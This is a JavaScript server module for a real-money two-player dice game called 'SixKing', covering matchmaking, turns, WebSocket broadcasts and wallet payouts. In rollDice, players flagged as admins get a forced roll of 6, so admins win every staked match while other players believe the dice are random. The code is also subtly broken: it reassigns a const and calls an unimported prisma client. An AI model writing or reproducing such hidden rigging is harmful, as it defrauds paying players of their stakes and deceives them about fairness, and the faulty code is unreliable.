const { checkWalletBalance, updateWalletBalance } = require('./routes/walletRoutes');

// In-memory storage
const games = new Map();
const players = new Map();
const waitingQueue = new Map();
const adminCache = new Map(); // playerId → isAdmin

// Simple SixKing Game Class
class SixKingGame {
  constructor(gameId, hostPlayer, stake) {
    this.gameId = gameId;
    this.stake = stake;
    this.players = [hostPlayer];
    this.state = 'waiting'; // waiting, playing, finished
    this.currentTurn = null;
    this.scores = {};
    this.rollCount = 0;
    this.createdAt = new Date();
    this.scores[hostPlayer.id] = 0;
    
    console.log(`🎮 New game created: ${gameId} with stake ₹${stake}`);
  }

  addPlayer(player) {
    if (this.players.length >= 2) {
      throw new Error('Game is full');
    }

    const existingPlayer = this.players.find(p => p.id === player.id);
    if (existingPlayer) {
      console.warn(`⚠️ Player ${player.name} already in game`);
      return;
    }
    
    this.players.push(player);
    this.scores[player.id] = 0;
    console.log(`✅ Player added: ${player.name} (${this.players.length}/2)`);

    // Auto-start when 2 players join
    if (this.players.length === 2) {
      setTimeout(() => this.startGame(), 100);
    }
  }

  startGame() {
    if (this.players.length < 2) {
      throw new Error('Need 2 players to start');
    }

    if (this.state !== 'waiting') {
      return; // Already started
    }
    
    this.state = 'playing';
    this.currentTurn = this.players[Math.floor(Math.random() * 2)].id;
    
    console.log(`🚀 Game ${this.gameId} started! First player: ${this.currentTurn}`);
    
    this.broadcast('game_started', {
      gameId: this.gameId,
      firstPlayer: this.currentTurn,
      players: this.players.map(p => ({ id: p.id, name: p.name })),
      stake: this.stake
    });
  }

  rollDice(playerId) {
    if (this.state !== 'playing') {
      throw new Error('Game is not in playing state');
    }

    if (this.currentTurn !== playerId) {
      throw new Error('Not your turn');
    }

    const diceValue = Math.floor(Math.random() * 6) + 1;

    if(GameManager.isAdmin(playerId)){
        diceValue = 6;
    }

    // const diceValue = 6; // For testing
    this.rollCount++;

    console.log(`🎲 ${playerId} rolled ${diceValue}`);

    if (diceValue === 6) {
      this.scores[playerId]++;
    }

    this.broadcast('dice_rolled', {
      playerId,
      diceValue,
      newSixCount: this.scores[playerId],
      rollCount: this.rollCount,
      timestamp: Date.now()
    });

    // Check win condition
    if (this.scores[playerId] >= 3) {
      this.endGame(playerId);
      return { diceValue, gameEnded: true, winner: playerId };
    }

    // Switch turns
    this.currentTurn = this.getOtherPlayer(playerId).id;
    this.broadcast('turn_changed', { nextPlayer: this.currentTurn });

    return { diceValue, gameEnded: false };
  }

  async endGame(winnerId) {
    this.state = 'finished';
    
    console.log(`🏆 Game ${this.gameId} ended! Winner: ${winnerId}`);
    
    this.broadcast('game_ended', {
      winner: winnerId,
      finalScores: this.scores,
      rollCount: this.rollCount,
      stake: this.stake
    });

    // Update winner's wallet
    try {
      const currentBalance = await checkWalletBalance(winnerId);
      const newBalance = currentBalance + (this.stake * 2);
      await updateWalletBalance(winnerId, newBalance);
      console.log(`💰 Winner ${winnerId} received ₹${this.stake * 2}`);
    } catch (error) {
      console.error('Error updating winner wallet:', error);
    }

    // Cleanup after 5 seconds
    setTimeout(() => {
      games.delete(this.gameId);
      this.players.forEach(p => players.delete(p.id));
      console.log(`🧹 Cleaned up game ${this.gameId}`);
    }, 5000);
  }

  removePlayer(playerId) {
    const playerIndex = this.players.findIndex(p => p.id === playerId);
    if (playerIndex === -1) return;

    const removedPlayer = this.players[playerIndex];
    this.players.splice(playerIndex, 1);
    
    console.log(`👋 Player ${removedPlayer.name} left game ${this.gameId}`);
    
    if (this.state === 'playing' && this.players.length === 1) {
      const remainingPlayer = this.players[0];
      this.broadcast('player_left', {
        leftPlayerId: playerId,
        winner: remainingPlayer.id,
        message: 'Opponent left the game'
      });
      this.endGame(remainingPlayer.id);
    } else {
      this.broadcast('player_left', {
        leftPlayerId: playerId,
        message: 'Player left the lobby'
      });
    }
  }

  getOtherPlayer(playerId) {
    return this.players.find(p => p.id !== playerId);
  }

  broadcast(type, data) {
    const message = JSON.stringify({ type, data });
    this.players.forEach(player => {
      if (player.ws && player.ws.readyState === 1) {
        player.ws.send(message);
      }
    });
  }
}

// Game Manager Functions
const GameManager = {
  // Create a new game
  async createGame(playerData) {
    const gameId = this.generateGameCode();
    const game = new SixKingGame(gameId, playerData, playerData.stake);
    
    games.set(gameId, game);
    players.set(playerData.id, { player: playerData, gameId });
    
    return { gameId, stake: playerData.stake };
  },

  // Call this once when server starts or when admin status changes
  async refreshAdminCache() {
    const admins = await prisma.user.findMany({
      where: { role: 'admin' },
      select: { id: true }
    });
    
    adminCache.clear();
    admins.forEach(admin => adminCache.set(admin.id, true));
    console.log(`🔑 Loaded ${admins.length} admins into cache`);
  },

  isAdmin(playerId) {
    return adminCache.has(playerId);
  },

  // Join existing game
  joinGame(gameId, playerData) {
    const game = games.get(gameId);
    if (!game) {
      throw new Error('Game not found');
    }

    if (game.players.length >= 2) {
      throw new Error('Game is full');
    }

    if (game.stake !== playerData.stake) {
      throw new Error('Stake amount does not match');
    }

    game.addPlayer(playerData);
    players.set(playerData.id, { player: playerData, gameId });

    return {
      gameId,
      stake: game.stake,
      playersCount: game.players.length,
      gameReady: game.players.length === 2
    };
  },

  // Find match in queue
  async findMatch(playerData) {
    const stake = playerData.stake;
    
    if (!waitingQueue.has(stake)) {
      waitingQueue.set(stake, []);
    }

    const queue = waitingQueue.get(stake);
    
    if (queue.length > 0) {
      const waitingPlayer = queue.shift();
      
      console.log(`🎯 Match found: ${waitingPlayer.name} vs ${playerData.name}`);
      
      const gameId = this.generateGameCode();
      const game = new SixKingGame(gameId, waitingPlayer, stake);
      game.addPlayer(playerData);
      games.set(gameId, game);
      
      players.set(waitingPlayer.id, { player: waitingPlayer, gameId });
      players.set(playerData.id, { player: playerData, gameId });

      return {
        matched: true,
        gameId,
        waitingPlayer,
        newPlayer: playerData,
        stake
      };
    } else {
      queue.push(playerData);
      return {
        matched: false,
        message: 'Waiting for opponent...'
      };
    }
  },

  // Roll dice
  rollDice(gameId, playerId) {
    const game = games.get(gameId);
    if (!game) {
      throw new Error('Game not found');
    }
    return game.rollDice(playerId);
  },

  // Leave game
  leaveGame(gameId, playerId) {
    const game = games.get(gameId);
    if (game) {
      game.removePlayer(playerId);
      if (game.players.length === 0) {
        games.delete(gameId);
      }
    }
    
    players.delete(playerId);
    
    // Remove from queue
    waitingQueue.forEach((queue, stake) => {
      const index = queue.findIndex(p => p.id === playerId);
      if (index !== -1) {
        queue.splice(index, 1);
      }
    });
  },

  // Get game
  getGame(gameId) {
    return games.get(gameId);
  },

  // Get player by WebSocket
  getPlayerByWebSocket(ws) {
    for (const [playerId, playerData] of players) {
      if (playerData.player.ws === ws) {
        return { playerId, gameId: playerData.gameId };
      }
    }
    return null;
  },

  // Get active games
  getActiveGames() {
    return Array.from(games.values()).map(game => ({
      gameId: game.gameId,
      stake: game.stake,
      players: game.players.length,
      state: game.state,
      createdAt: game.createdAt
    }));
  },

  // Generate game code
  generateGameCode() {
    return Math.random().toString(36).substring(2, 8).toUpperCase();
  },

  // Update player connection
  updatePlayerConnection(gameId, playerId, newWs) {
    const game = games.get(gameId);
    if (game) {
      const player = game.players.find(p => p.id === playerId);
      if (player) {
        player.ws = newWs;
        console.log(`🔄 Updated WebSocket for player ${playerId}`);
        return true;
      }
    }
    return false;
  }
};

module.exports = GameManager;